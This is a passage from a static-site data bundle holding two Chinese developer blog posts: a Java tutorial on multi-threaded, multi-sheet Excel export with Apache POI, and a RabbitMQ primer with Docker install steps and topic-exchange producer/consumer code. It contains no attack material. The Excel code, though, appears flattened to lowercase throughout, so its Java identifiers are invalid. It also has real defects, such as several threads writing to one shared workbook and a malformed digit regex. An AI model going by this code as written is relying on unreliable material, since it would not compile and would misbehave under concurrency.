                      object value = map.get(key);\n//                        if ((stringutil.isnotblank(value))) {\n                        if (!(org.springframework.util.stringutils.isempty(value))) {\n                            //不晓得 此处为啥有线程安全问题\n                            synchronized (threadexcelutils.class) {\n                                if (value instanceof date) {\n                                    simpledateformat sdf = new simpledateformat("yyyy-mm-dd");\n                                    string format = sdf.format(value);\n                                    row1.createcell(j).setcellvalue(format);\n                                } else {\n                                    try {\n                                        row1.createcell(j).setcellvalue(value.tostring());\n                                    } catch (exception e) {\n                                        e.printstacktrace();\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n\n\n\n# 5. 浏览器：多线程多sheet页下载\n\n * 先引入依赖\n\n\x3c!-- https://mvnrepository.com/artifact/org.apache.poi/poi-ooxml --\x3e\n        <dependency>\n            <groupid>org.apache.poi</groupid>\n            <artifactid>poi-ooxml</artifactid>\n            <version>3.9</version>\n        </dependency>\n        \x3c!-- https://mvnrepository.com/artifact/org.apache.poi/poi-ooxml --\x3e\n        <dependency>\n            <groupid>org.apache.poi</groupid>\n            <artifactid>poi</artifactid>\n            <version>3.9</version>\n        </dependency>\n        \x3c!-- https://mvnrepository.com/artifact/commons-io/commons-io --\x3e\n        <dependency>\n            <groupid>commons-io</groupid>\n            <artifactid>commons-io</artifactid>\n            <version>2.4</version>\n        </dependency>\n        \x3c!-- https://mvnrepository.com/artifact/log4j/log4j --\x3e\n        <dependency>\n            <groupid>log4j</groupid>\n            <artifactid>log4j</artifactid>\n            <version>1.2.17</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n * 创建下载工具类（我写的太low，可以自己优化）\n\npackage com.zpj.electric.util;\n\nimport java.io.outputstream;\nimport java.text.simpledateformat;\nimport java.util.arraylist;\nimport java.util.date;\nimport java.util.list;\nimport java.util.concurrent.countdownlatch;\nimport java.util.concurrent.executionexception;\nimport java.util.concurrent.executorservice;\nimport java.util.concurrent.executors;\nimport java.util.concurrent.future;\nimport java.util.regex.matcher;\nimport java.util.regex.pattern;\n\nimport javax.servlet.http.httpservletresponse;\n\nimport org.apache.commons.io.ioutils;\nimport org.apache.log4j.logger;\nimport org.apache.poi.hssf.usermodel.hssfcell;\nimport org.apache.poi.hssf.usermodel.hssfcellstyle;\nimport org.apache.poi.hssf.usermodel.hssfclientanchor;\nimport org.apache.poi.hssf.usermodel.hssffont;\nimport org.apache.poi.hssf.usermodel.hssfpatriarch;\nimport org.apache.poi.hssf.usermodel.hssfrichtextstring;\nimport org.apache.poi.hssf.usermodel.hssfrow;\nimport org.apache.poi.hssf.usermodel.hssfsheet;\nimport org.apache.poi.hssf.usermodel.hssfworkbook;\nimport org.apache.poi.ss.usermodel.indexedcolors;\nimport org.apache.poi.ss.util.cellrangeaddress;\nimport org.apache.poi.xssf.usermodel.xssfcell;\nimport org.apache.poi.xssf.usermodel.xssfcellstyle;\nimport org.apache.poi.xssf.usermodel.xssffont;\nimport org.apache.poi.xssf.usermodel.xssfrichtextstring;\nimport org.apache.poi.xssf.usermodel.xssfrow;\nimport org.apache.poi.xssf.usermodel.xssfsheet;\nimport org.apache.poi.xssf.usermodel.xssfworkbook;\n\npublic class excelutil {\n\n\tprivate static logger log = logger.getlogger(excelutil.class);\n\n\tprivate static simpledateformat sdf = new simpledateformat("yyyymmddhhmmss");\n\tprivate final static string exce_version_03 = "03";\n\tprivate final static string exce_version_07 = "07";\n\n\t/**\n\t * @param resp\n\t * @param filename\n\t *            文件名，一级表头\n\t * @param usefirsttitle\n\t *            是否需要一级表头，true：是，false：否\n\t * @param version\n\t *            导出版本，可选值为 07，统一用07版\n\t * @param titles\n\t *            excel列名\n\t * @param data\n\t *            需要导出的数据集合\n\t */\n\tpublic static void exportexcel(httpservletresponse resp, string filename,\n\t\t\tboolean usefirsttitle, string version, string[] titles,\n\t\t\tlist<object[]> data) {\n\t\t// 如果传入的文件名为空，则使用当前时间作为文件名\n\t\tstring excelfilename = "";\n\t\tif ("".equals(filename) || filename == null) {\n\t\t\texcelfilename = sdf.format(new date());\n\t\t}\n\t\t// (data.size() >= 0) 当列表中没有数据时，导出的excel加上标题等。\n\t\tif (titles.length >= 0) {\n\t\t\ttry {\n\t\t\t\tif (exce_version_03.equals(version)) {\n\t\t\t\t\texcelfilename = filename + ".xls";\n\t\t\t\t} else if (exce_version_07.equals(version)) {\n\t\t\t\t\texcelfilename = filename + ".xlsx";\n\t\t\t\t}\n\n\t\t\t\tresp.setcontenttype("application/x-msdownload");\n\t\t\t\texcelfilename = new string(excelfilename.getbytes("gb2312"), "iso8859-1");\n\t\t\t\tresp.addheader("content-disposition", "attachment;filename="\n\t\t\t\t\t\t+ excelfilename);\n\t\t\t\toutputstream out = resp.getoutputstream();\n\t\t\t\tif (exce_version_03.equals(version)) {\n\t\t\t\t\texprotexcel_03(filename, titles, usefirsttitle, data, out);\n\t\t\t\t} else if (exce_version_07.equals(version)) {\n\t\t\t\t\texprotexcel_07_plus(excelfilename, titles, usefirsttitle, data, out);\n\t\t\t\t}\n\t\t\t} catch (exception e) {\n\t\t\t\tlog.error("", e);\n\t\t\t}\n\t\t}\n\t}\n\n\tprivate static void exprotexcel_07_plus(string filename, string[] titles,\n\t\t\tboolean usefirsttitle, list<object[]> data, outputstream out) {\n\t\txssfworkbook wb = new xssfworkbook();\n\n\t\t//把要下载的数据分为多个sheet下载\n\t\tlist<list<object[]>> datalist = createlist(data, 50000);\n\t\tlong start = system.currenttimemillis();\n\t\tsystem.out.println("下载开始时间：" + start);\n\n\t\t//使用多线程下载\n\t\texecutorservice es = executors.newfixedthreadpool(datalist.size());\n\t\t//使用计步器\n\t\t// final countdownlatch donesignal = new countdownlatch(datalist.size());\n\t\tcountdownlatch donesignal = new countdownlatch(datalist.size());\n\n\t\ttry {\n\n\t\tfor(int x = 0;x<datalist.size();x++){\n\t\t\tpoiwriter poiwriter = new poiwriter(x, wb, filename, titles, data, datalist, usefirsttitle, donesignal);\n\t\t\tfuture future = es.submit(poiwriter);\n\t\t\t /*try {\n\t\t\t\t \t//如果future.get()返回null，任务完成\n\t\t            if(future.get()==null){\n\t\t                system.out.println("第"+(x+1)+"个sheet页，任务完成");\n\t\t            }\n\t\t        } catch (interruptedexception e) {\n\t\t        } catch (executionexception e) {\n\t\t            //失败\n\t\t            system.out.println("第"+(x+1)+"个sheet页，任务失败："+e.getcause().getmessage());\n\t\t        }*/\n\t\t\t//new poiwriter(x, wb, filename, titles, data, datalist, usefirsttitle, null).run();\n\t\t}\n\t\tdonesignal.await();//阻塞，直到计数器的值为0，才让主线程往下执行\n\t    es.shutdown();//关闭线程池\n\t\tlong end = system.currenttimemillis();\n\t\tsystem.out.println("总计下载时间：" + ((end-start)/1000) + "s");\n\t\t\twb.write(out);\n\t\t\tout.flush();\n\t\t\tout.close();\n\t\t} catch (exception e) {\n\t\t\tlog.error("", e);\n\t\t} finally {\n\t\t\tioutils.closequietly(out);\n\t\t}\n\n\t}\n\n\n\t public static list<list<object[]>>  createlist(list<object[]> targe,int size) {\n\t\t        list<list<object[]>> listarr = new arraylist<list<object[]>>();\n\t\t        //获取被拆分的数组个数\n\t\t        int arrsize = targe.size()%size==0?targe.size()/size:targe.size()/size+1;\n\t\t        for(int i=0;i<arrsize;i++) {\n\t\t            list<object[]>  sub = new arraylist<object[]>();\n\t\t            //把指定索引数据放入到list中\n\t\t            for(int j=i*size;j<=size*(i+1)-1;j++) {\n\t\t                if(j<=targe.size()-1) {\n\t\t                \t//得到拆分后的集合\n\t\t                    sub.add(targe.get(j));\n\t\t                }\n\t\t            }\n\t\t            //拆分的集合可以做点什么\n\t\t            //sub.dosomething();\n\t\t            //将拆分后的集合综合为一个集合\n\t\t            listarr.add(sub);\n\t\t        }\n\t\t        return listarr;\n\t }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n\n * 线程类\n\npackage com.zpj.electric.util;\n\nimport org.apache.poi.hssf.usermodel.hssfcellstyle;\nimport org.apache.poi.ss.usermodel.indexedcolors;\nimport org.apache.poi.ss.util.cellrangeaddress;\nimport org.apache.poi.xssf.usermodel.*;\n\nimport java.text.simpledateformat;\nimport java.util.date;\nimport java.util.list;\nimport java.util.concurrent.countdownlatch;\nimport java.util.regex.matcher;\nimport java.util.regex.pattern;\n\npublic class poiwriter implements runnable {\n\n\tpublic int x;//第几个sheet页\n\tpublic xssfworkbook wb;//poi workbook\n\tpublic string filename;//要导出的文件名字(含后缀)\n\tpublic string[] titles;//标题\n\tpublic list<object[]> data;//全部数据\n\tpublic list<list<object[]>> datalist;//包含了各个sheet页的数据\n\tpublic boolean usefirsttitle;//是否需要表头\n\tpublic  countdownlatch donesignal;//多线程栅栏计步器\n\n\n\tpublic poiwriter(int x, xssfworkbook wb, string filename, string[] titles,\n\t\t\tlist<object[]> data, list<list<object[]>> datalist,\n\t\t\tboolean usefirsttitle, countdownlatch donesignal) {\n\t\tsuper();\n\t\tthis.x = x;\n\t\tthis.wb = wb;\n\t\tthis.filename = filename;\n\t\tthis.titles = titles;\n\t\tthis.data = data;\n\t\tthis.datalist = datalist;\n\t\tthis.usefirsttitle = usefirsttitle;\n\t\tthis.donesignal = donesignal;\n\t}\n\n\tpublic poiwriter() {\n\n\t}\n\n\t@override\n\tpublic void run() {\n\t\tlong start1 = system.currenttimemillis();\n\t\tsystem.out.println(filename+"：第"+(x+1)+"个sheet开始时间：" + start1);\n\t\t// 创建一sheet页\n\t\txssfsheet sheet = wb.createsheet("sheet"+x);\n\t\t// 设置格式 在单元格中右排放\n\t\txssfcellstyle style = wb.createcellstyle();\n\t\tstyle.setalignment(xssfcellstyle.align_right);\n\n\t\tint firstrow = 0;\n\t\tif (usefirsttitle) {\n\t\t\txssfrow fr = sheet.createrow(firstrow);\n\t\t\txssffont font = wb.createfont();\n\t\t\tfont.setfontname("宋体");\n\t\t\tfont.setfontheightinpoints((short) 16);\n\t\t\txssfcellstyle cs = wb.createcellstyle();\n\t\t\tcs.setalignment(xssfcellstyle.align_center);\n\t\t\tcs.setverticalalignment(xssfcellstyle.vertical_center);\n\t\t\tcs.setfont(font);\n\t\t\tfr.setheight((short) 700);\n\t\t\tfr.setheight((short) 700);\n\t\t\t//excel大标题和并列多了一列，当列表中数据为空时，导出的excel中加上标题等信息\n\t\t\tsheet.addmergedregion(new cellrangeaddress(0, 0, 0,\n\t\t\t\t\ttitles.length-1));\n\t\t\tfor (int i = 0; i < titles.length; i++) {\n\t\t\t\tfr.createcell(i);\n\t\t\t}\n\t\t\t/**\n\t\t\t * 自适应宽度\n\t\t\t */\n\t\t\tif(null!=data&&data.size()>0){\n\t\t\t\tobject[] obj=data.get(0);\n\t\t\t\tif(obj.length==titles.length){\n\t\t\t\t\tfor(int i=0;i<titles.length;i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tint contentlength=titles[i].length();\n\t\t\t\t\t\tif(null!=obj[i]&&obj[i].tostring().length()>titles[i].length()){\n\t\t\t\t\t\t\tcontentlength=obj[i].tostring().length();\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif(i==0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t//the maximum column width for an individual cell is 255 characters. 的解决方案\n\t\t\t\t\t\t\tif((short)50*(50+contentlength)/256>255){\n\t\t\t\t\t\t\t\tsheet.setcolumnwidth(i, (short)254*256);  //初始列宽+自适应宽度\n\t\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\t\tsheet.setcolumnwidth(i, (short)50*(50+contentlength));  //初始列宽+自适应宽度\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\t//the maximum column width for an individual cell is 255 characters. 的解决方案\n\t\t\t\t\t\t\tif((short)100*(55+contentlength)/256>255){\n\t\t\t\t\t\t\t\tsheet.setcolumnwidth(i, (short)254*256);  //初始列宽+自适应宽度\n\t\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\t\tsheet.setcolumnwidth(i, (short)100*(55+contentlength));  //初始列宽+自适应宽度\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}else{\n\t\t\t\t\tfor(int i=0;i<titles.length;i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tint contentlength=titles[i].length();\n\t\t\t\t\t\tif(i==0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tsheet.setcolumnwidth(i, (short)50*(50+contentlength));  //初始列宽+自适应宽度\n\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\tsheet.setcolumnwidth(i, (short)100*(55+contentlength));  //初始列宽+自适应宽度\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\t//创建新的样式给列表的大标题加上背景色\n\t\t\t xssfcellstyle alignstyle = (xssfcellstyle)wb.createcellstyle();\n\t\t\t alignstyle.setalignment(xssfcellstyle.align_center);\n\t\t\t alignstyle.setverticalalignment(xssfcellstyle.vertical_center);\n\t\t\t alignstyle.setfillpattern(hssfcellstyle.solid_foreground);\n\t\t\t alignstyle.setfillforegroundcolor(indexedcolors.sky_blue.getindex());\n\t\t\t alignstyle.setfont(font);\n\t\t\tfr.getcell(0).setcellvalue(new xssfrichtextstring(filename));\n\t\t\tfr.getcell(0).setcellstyle(alignstyle);\n\t\t\tfirstrow += 1;\n\t\t}\n\n\t\txssfrow row = sheet.createrow(firstrow);\n\t\tfor (int i = 0; i < titles.length; i++) {\n\t\t\trow.createcell(i).setcellvalue(new xssfrichtextstring(titles[i]));\n\t\t}\n\n\n\t\t\tfor (int i = 0; i < datalist.get(x).size(); i++) {\n\t\t\t\txssfrow r = sheet.createrow(i + firstrow + 1);\n\t\t\t\tobject[] obj = datalist.get(x).get(i);\n\t\t\t\tfor (int j = 0; j < obj.length; j++) {\n\t\t\t\t\t// 创建单元格\n\t\t\t\t\txssfcell cell = r.createcell(j);\n\t\t\t\t\tobject value = obj[j];\n\t\t\t\t\t// 判断值的类型后进行强制类型转换\n\t\t\t\t\tstring textvalue = null;\n\t\t\t\t\tif (value instanceof date) {\n\t\t\t\t\t\tdate date = (date) value;\n\t\t\t\t\t\tsimpledateformat sdf = new simpledateformat(\n\t\t\t\t\t\t\t\t"yy-mm-dd hh:mm:ss");\n\t\t\t\t\t\ttextvalue = sdf.format(date);\n\t\t\t\t\t} else if (value instanceof byte[]) {\n\t\t\t\t\t\t// 有图片时，设置行高为60px;\n\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif (value == null) {\n\t\t\t\t\t\t\t// 如果值为空，什么都不做\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t// 其它数据类型都当作字符串简单处理\n\t\t\t\t\t\t\ttextvalue = value.tostring();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t// 如果不是图片数据，就利用正则表达式判断textvalue是否全部由数字组成\n\t\t\t\t\tif (textvalue != null) {\n\t\t\t\t\t\tpattern p = pattern.compile("^//d+(//.//d+)?$");\n\t\t\t\t\t\tmatcher matcher = p.matcher(textvalue);\n\t\t\t\t\t\tif (matcher.matches()) {\n\t\t\t\t\t\t\t// 是数字当作double处理\n\t\t\t\t\t\t\tcell.setcellvalue(double.parsedouble(textvalue));\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\txssfrichtextstring richstring = new xssfrichtextstring(\n\t\t\t\t\t\t\t\t\ttextvalue);\n\t\t\t\t\t\t\tcell.setcellvalue(richstring);\n\t\t\t\t\t\t}\n\t\t\t\t\t} else {// 若果是空值，单元格显示为空\n\t\t\t\t\t\tcell.setcellvalue(new xssfrichtextstring(""));\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tlong end1 = system.currenttimemillis();\n\t\t\tsystem.out.println("第"+(x+1)+"个sheet总计时间：" +((end1-start1)/1000) + "s");\n\t\t\tif(donesignal!=null){\n\t\t\t\tdonesignal.countdown(); // 线程计数-1\n\t\t\t\tsystem.out.println("第" + (x+1) + "个sheet创建完成，" + "计数器减1");\n\t\t\t}\n\t}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"RabbitMQ - 基础",frontmatter:{title:"RabbitMQ - 基础",date:"2019-08-17T00:00:00.000Z",tags:["RabbitMQ"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/rabbitmq001.html",relativePath:"views/backend/rabbitmq001.md",key:"v-37e80c74",path:"/views/backend/rabbitmq001.html",headers:[{level:2,title:"AMQP",slug:"amqp",normalizedTitle:"amqp",charIndex:50},{level:2,title:"Message Queue",slug:"message-queue",normalizedTitle:"message queue",charIndex:58},{level:2,title:"RabbitMQ",slug:"rabbitmq",normalizedTitle:"rabbitmq",charIndex:0},{level:2,title:"RabbitMQ应用场景",slug:"rabbitmq应用场景",normalizedTitle:"rabbitmq应用场景",charIndex:87},{level:2,title:"RabbitMQ的安装（基于Docker）",slug:"rabbitmq的安装-基于docker",normalizedTitle:"rabbitmq的安装（基于docker）",charIndex:103},{level:3,title:"Docker环境安装",slug:"docker环境安装",normalizedTitle:"docker环境安装",charIndex:130},{level:3,title:"RabbitMQ安装",slug:"rabbitmq安装",normalizedTitle:"rabbitmq安装",charIndex:146},{level:2,title:"RabbitMQ的使用",slug:"rabbitmq的使用",normalizedTitle:"rabbitmq的使用",charIndex:160},{level:3,title:"九大核心要素",slug:"九大核心要素",normalizedTitle:"九大核心要素",charIndex:177},{level:3,title:"6种消息队列模型",slug:"_6种消息队列模型",normalizedTitle:"6种消息队列模型",charIndex:189},{level:4,title:"主题模型",slug:"主题模型",normalizedTitle:"主题模型",charIndex:2326},{level:2,title:"SpringBoot整合RabbitMQ",slug:"springboot整合rabbitmq",normalizedTitle:"springboot整合rabbitmq",charIndex:201},{level:2,title:"其它",slug:"其它",normalizedTitle:"其它",charIndex:225}],excerpt:"<Boxx/>\n<p>RabbitMQ的5种主题模式、使用场景、在Spring、SpringBoot中的使用</p>\n",headersStr:"AMQP Message Queue RabbitMQ RabbitMQ应用场景 RabbitMQ的安装（基于Docker） Docker环境安装 RabbitMQ安装 RabbitMQ的使用 九大核心要素 6种消息队列模型 主题模型 SpringBoot整合RabbitMQ 其它",content:'RabbitMQ的5种主题模式、使用场景、在Spring、SpringBoot中的使用\n\n\n\n * AMQP\n * Message Queue\n * RabbitMQ\n * RabbitMQ应用场景\n * RabbitMQ的安装（基于Docker）\n   * Docker环境安装\n   * RabbitMQ安装\n * RabbitMQ的使用\n   * 九大核心要素\n   * 6种消息队列模型\n * SpringBoot整合RabbitMQ\n * 其它\n\n\n\n\n# AMQP\n\n * AMQP，即Advanced Message Queuing Protocol，一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品、不同的开发语言等条件的限制。\n\n\n# Message Queue\n\n * Message queue，即消息队列，是一种进程间通信或同一进程的不同线程间的通信方式，软件的贮列用来处理一系列的输入，通常是来自用户。消息队列提供了异步的通信协议，每一个贮列中的纪录包含详细说明的数据，包含发生的时间，输入设备的种类，以及特定的输入参数，也就是说：消息的发送者和接收者不需要同时与消息队列交互。消息会保存在队列中，直到接收者取回它。\n\n\n# RabbitMQ\n\n * 官网：http://www.rabbitmq.com/\n\n * RabbitMQ是基于Erlang语言开发的实现了高级消息队列协议（AMQP)的开源消息代理中间件，支持多种语言，多个平台。\n   \n   \n\n\n# RabbitMQ应用场景\n\n 1. 异步处理\n 2. 应用解耦\n 3. 流量削峰 -- 传送门\n\n\n# RabbitMQ的安装（基于Docker）\n\n> 基于Windows的安装忽略（注意的就是提前安装对应版本的Erlang环境）\n\n\n# Docker环境安装\n\n 1. 安装yum-utils：\n\nyum install -y yum -utils device -mapper -persistent -data lvm2\n\n\n1\n\n 2. 为yum源添加docker仓库位置：\n\nyum -config -manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\n\n\n1\n\n 3. 安装docker：\n\nyum install docker-ce\n\n\n1\n\n 4. 启动docker：\n\nsystemctl start docker\n\n\n1\n\n\n\n# RabbitMQ安装\n\n 1. 下载rabbitmq3.7.15的docker镜像：\n\ndocker pull rabbitmq:3.7.15\n\n\n1\n\n 2. 使用docker命令启动：\n\ndocker run -d --name rabbitmq \\\n-p 5672:5672 -p 15672:15672 \\\nrabbitmq:3.7.15\n\n\n1\n2\n3\n\n 3. 进入容器并开启管理功能：\n\ndocker exec -it rabbitmq /bin/bash \nrabbitmq-plugins enable rabbitmq_management\n\n\n1\n2\n\n 4. 开启防火墙：\n\nfirewall-cmd --zone=public --add-port=15672/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n 5. 访问地址查看是否安装成功：\n    * http://192.168.3.101:15672/\n    * 默认账号密码均为：guest\n\n\n# RabbitMQ的使用\n\n\n# 九大核心要素\n\n名称             释义\nConnection     获取rabbitmq连接，比如一个TCP连接\nChannel        不管是发布消息、订阅队列还是接收消息，这些动作都是通过信道完成。因为对于操作系统来说建立和销毁 TCP\n               都是非常昂贵的开销，所以引入了信道的概念，以复用一条 TCP 连接，AMQP 命令都是通过信道发出去的\nPublisher      生产者\nMessage        消息体\nExchange       交换器，Exchange有4种类型： direct(直接)， fanout(广播), topic(主题),\n               和headers，不同类型的Exchange转发消息的策略有所区别\nQueue          消息队列，用来保存消息直到消费者进行消费。\nBinding        绑定，用于消息队列和交换器之间的关联。Exchange 和Queue的绑定可以是多对多的关系\nConsumer       消费者\nVirtual Host   虚拟主机，表示一批交换器、消息队列和相关对象。RabbitMQ 默认的 vhost 是 /\n\n\n# 6种消息队列模型\n\n\n\n * 官网是真的真的真的是最好的学习路径：https://www.rabbitmq.com/getstarted.html\n * 官网实例源码rabbitmq-java-maven：https://github.com/rabbitmq/rabbitmq-tutorials/tree/master/java-mvn\n\n# 主题模型\n\n> 这里挑最主要的topic（主题）模型，介绍一下\n\n\n\n举例：如上图的主题模式中，交换机类型设为topic， Q1绑定 *.orange.* 路由键，Q2绑定两个路由键，分别是 *.*.rabbit 以及 lazy.#\n\n 1. 如果生产者发送路由键为quick.orange.rabbit消息，C1和C2都可以接收到。\n 2. 如果为lazy.orange.elephant， C1和C2都可以接收到\n 3. 如果为quick.orange.fox， 只要C1可以接收到\n 4. 如果为lazy.brown.fox， 只有C2可以接收到\n 5. 如果为lazy.pink.rabbit， C1，C2都可以\n 6. 如果为quick.brown.fox， 都不会接收到\n\ntopic交换机，配置路由键的时候可以配置 *, # 来模糊匹配\n\n 1. * 号表示可以精确匹配一个单词\n 2. # 号可以匹配0个或者多个单词\n\n# 多个消费者公平分发\n\npackage com.zpj.electric.rabbitMq;\n\nimport java.io.IOException;\n\n/**\n * Created by admin on 2019/12/2.\n * 用的是：\n  \t\t<dependency>\n            <groupId>com.rabbitmq</groupId>\n            <artifactId>amqp-client</artifactId>\n            <version>3.0.4</version>\n        </dependency>\n */\npublic class TestConsumer {\n    public static void main(String[] args) throws IOException {\n        //测试公平分发\n        Consumer recv1 = new Consumer("A",500);\n        recv1.recv_2();\n\n        Consumer recv2_2 = new Consumer("B",2000);\n        recv2_2.recv_2();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 生产者\n\npackage com.zpj.electric.rabbitMq;\n\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.rabbitmq.client.MessageProperties;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeoutException;\n\npublic class Producter {\n\n    private static final String EXCHANGE_NAME = "test_exchange_topic";\n\n    public static void main(String[] args) throws IOException, TimeoutException {\n        // 获取连接\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost("127.0.0.1");\n        factory.setUsername("guest");\n        factory.setPassword("guest");\n        factory.setPort(5672);\n        Connection connection = factory.newConnection();\n        // 从连接开一个通道\n        Channel channel = connection.createChannel();\n        // 声明一个topic路由交换机，交换机持久化\n//        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC);\n        channel.exchangeDeclare(EXCHANGE_NAME, "topic", true);\n\n        // 发送消息\n        String message = "hello, quick.orange.rabbit";\n        /*参数说明：\n            String exchange -- 交换机名称\n        \tString routingKey -- 路由关键字\n        \tBasicProperties props -- 消息的基本属性，例如路由头等\n        \tbyte[] body -- 消息体\n        */\n        for (int i = 0; i < 100; i++) {\n            message = "hello, quick.orange.rabbit" + "  -------  " + i;\n\n            //参数：交换机名，路由键，消息持久化的，消息体\n            channel.basicPublish(EXCHANGE_NAME, "quick.orange.rabbit", MessageProperties.PERSISTENT_TEXT_PLAIN, message.getBytes());\n            System.out.println(" [x] Sent message : \'" + message + "\'");\n        }\n\n        channel.close();\n        connection.close();\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\n# 消费者\n\npackage com.zpj.electric.rabbitMq;\n\nimport com.rabbitmq.client.*;\n\nimport java.io.IOException;\n\npublic  class Consumer {\n\n    private static final String QUEUE_NAME = "test_queue_topic_1";\n    private static final String EXCHANGE_NAME = "test_exchange_topic";\n\n    //消费者名称\n    private String name;\n    //休眠时间\n    private int sleepTime;\n\n    public Consumer(String name, int sleepTime) {\n        this.name = name;\n        this.sleepTime = sleepTime;\n    }\n\n    public void recv_2() throws IOException {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost("127.0.0.1");\n        factory.setUsername("guest");\n        factory.setPassword("guest");\n        factory.setPort(5672);\n        Connection 